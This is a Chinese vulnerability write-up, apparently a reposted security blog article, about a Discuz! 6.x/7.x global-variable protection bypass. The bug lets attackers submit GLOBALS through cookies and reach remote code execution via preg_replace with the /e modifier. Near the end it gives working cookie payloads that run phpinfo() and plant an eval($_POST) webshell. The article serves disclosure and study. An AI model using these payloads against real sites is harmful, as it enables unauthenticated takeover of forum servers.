> 原文链接: https://www.anquanke.com//post/id/82316 


# Discuz! 6.x/7.x 全局变量防御绕过导致命令执行


                                阅读量   
                                **151124**
                            
                        |
                        
                                                                                    



## 漏洞概述：

由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x/7.x 全局变量防御绕过漏洞。

## 漏洞分析：

```
include/global.func.php代码里：
function daddslashes($string, $force = 0) `{`
    !defined('MAGIC_QUOTES_GPC') &amp;&amp; define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());
    if(!MAGIC_QUOTES_GPC || $force) `{`
        if(is_array($string)) `{`
            foreach($string as $key =&gt; $val) `{`
                $string[$key] = daddslashes($val, $force);
            `}`
        `}` else `{`
            $string = addslashes($string);
        `}`
    `}`
    return $string;
`}`
include/common.inc.php里：
foreach(array('_COOKIE', '_POST', '_GET') as $_request) `{`
    foreach($$_request as $_key =&gt; $_value) `{`
        $_key`{`0`}` != '_' &amp;&amp; $$_key = daddslashes($_value);
    `}`
`}`
```

模拟register_globals功能的代码,在GPC为off时会调用addslashes()函数处理变量值,但是如果直接使<br>
用$_GET/$_POST/$_COOKIE这样的变量,这个就不起作用了,然而dz的源码里直接使用$_GET/$_POST/$_COOKIE的地<br>
方很少,存在漏洞的地方更加少:(

不过还有其他的绕过方法,在register_globals=on下通过提交GLOBALS变量就可以绕过上面的代码了.为了防止这种情况,dz中有如下代码:

```
if (isset($_REQUEST['GLOBALS']) OR isset($_FILES['GLOBALS'])) `{`
    exit('Request tainting attempted.');
`}`
```

这样就没法提交GLOBALS变量了么？

$_REQUEST这个超全局变量的值受php.ini中request_order的影响,在最新的php5.3.x系列<br>
中,request_order默认值为GP,也就是说默认配置下$_REQUEST只包含$_GET和$_POST,而不包括$_COOKIE,那么我<br>
们就可以通过COOKIE来提交GLOBALS变量了:)

[![](https://p4.ssl.qhimg.com/t01d870b131f7259e0a.jpg)](https://p4.ssl.qhimg.com/t01d870b131f7259e0a.jpg)

## 漏洞利用

## include/discuzcode.func.php

```
function discuzcode($message, $smileyoff, $bbcodeoff, $htmlon = 0, $allowsmilies = 1, $allowbbcode = 1, $allowimgcode =
1, $allowhtml = 0, $jammer = 0, $parsetype = '0', $authorid = '0', $allowmediacode = '0', $pid = 0) `{`
global $discuzcodes, $credits, $tid, $discuz_uid, $highlight, $maxsmilies, $db, $tablepre, $hideattach, $allowat
tachurl;
if($parsetype != 1 &amp;&amp; !$bbcodeoff &amp;&amp; $allowbbcode &amp;&amp; (strpos($message, '[/code]') || strpos($message, '[/CODE]')
) !== FALSE) `{`
$message = preg_replace("/s?[code](.+?)[/code]s?/ies", "codedisp('\1')", $message);
`}`
$msglower = strtolower($message);
//$htmlon = $htmlon &amp;&amp; $allowhtml ? 1 : 0;
if(!$htmlon) `{`
$message = $jammer ? preg_replace("/rn|n|r/e", "jammer()", dhtmlspecialchars($message)) : dhtmlspeci
alchars($message);
`}`
if(!$smileyoff &amp;&amp; $allowsmilies &amp;&amp; !empty($GLOBALS['_DCACHE']['smilies']) &amp;&amp; is_array($GLOBALS['_DCACHE']['smili
es'])) `{`
if(!$discuzcodes['smiliesreplaced']) `{`
foreach($GLOBALS['_DCACHE']['smilies']['replacearray'] AS $key =&gt; $smiley) `{`
$GLOBALS['_DCACHE']['smilies']['replacearray'][$key] = '&lt;img src="images/smilies/'.$GLOB
ALS['_DCACHE']['smileytypes'][$GLOBALS['_DCACHE']['smilies']['typearray'][$key]]['directory'].'/'.$smiley.'" smilieid="'
.$key.'" border="0" alt="" /&gt;';
`}`
$discuzcodes['smiliesreplaced'] = 1;
`}`
$message = preg_replace($GLOBALS['_DCACHE']['smilies']['searcharray'], $GLOBALS['_DCACHE']['smilies']['r
eplacearray'], $message, $maxsmilies);
`}`
```

注意到：

```
$message = preg_replace($GLOBALS['_DCACHE']['smilies']['searcharray'], 
$GLOBALS['_DCACHE']['smilies']['replacearray'], $message, $maxsmilies);
```

请求中Cookie带

GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();<br> 即可执行phpinfo。<br> GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval($_POST[c])%3B;<br> 即一句话木马。

此后门漏洞十分隐蔽，不容易发现。

## 利用条件：

1.discuz 6.x / 7.x

2.request_order默认值为GP

## 参考地址：

http://www.80vul.com/dzvul/sodb/19/sodb-2010-01.txt

Discuz!某两个版本前台产品命令执行（无需登录）

http://www.wooyun.org/bugs/wooyun-2010-080723


